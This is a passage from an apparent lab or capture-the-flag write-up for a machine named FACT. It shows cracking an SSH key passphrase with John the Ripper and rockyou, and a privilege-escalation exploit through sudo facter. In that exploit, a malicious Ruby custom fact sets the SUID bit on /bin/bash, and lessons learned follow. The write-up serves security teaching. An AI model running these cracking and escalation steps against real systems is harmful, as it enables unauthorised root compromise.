The vulnerability exists in:

##  Cracking the SSH Key Passphrase

The SSH private key was encrypted and required cracking.

### Convert Key for John
```
ssh2john trivia_id_ed25519 > trivia.hash
```
### Crack with RockYou
```
john --wordlist=/usr/share/wordlists/rockyou.txt trivia.hash
```

### Privilege Escalation via Facter
Why This Works

facter is a Ruby-based system profiling tool

It allows loading custom facts from a directory

Since it runs as root via sudo, any Ruby code in a custom fact executes as root

### Creating a Malicious Custom Fact

The goal is to set the SUID bit on /bin/bash.

### Create Exploit Directory and Ruby Payload

```
mkdir /tmp/exploit
echo 'Facter.add(:pwn_fact) do
  setcode { system("chmod +s /bin/bash") }
end' > /tmp/exploit/root.rb
```
### Execute the Exploit
```
sudo /usr/bin/facter --custom-dir=/tmp/exploit/ pwn_fact
```
### Root shell
With the SUID bit set, drop into a root shell:

## Lessons Learned
### 1. File Upload & Download Endpoints Are High Risk

Improper input validation in file handling functions can lead directly to full system compromise.

### 2. LFI Can Be as Dangerous as RCE

Even without direct command execution, LFI enables credential theft, SSH key exfiltration, and lateral movement.

### 3. SSH Key Security Matters

Weak passphrases on private keys make offline cracking trivial once keys are exposed.

### 4. Sudo Misconfigurations Are Critical

Allowing unrestricted execution of scripting-capable binaries (like Ruby-based tools) as root is extremely dangerous.

### 5. Chaining Small Issues Leads to Total Compromise

Individually, LFI, weak passphrases, and sudo misconfigurations may seem minor—but together they lead to root access.

## Conclusion

The FACT machine demonstrates a realistic attack chain combining web application vulnerabilities, credential abuse, and sudo misconfiguration. By exploiting a modern CMS LFI vulnerability and abusing Ruby execution within facter, full root compromise was achieved. This lab highlights the importance of secure coding practices, strong credential management, and strict sudo policies in production environments.
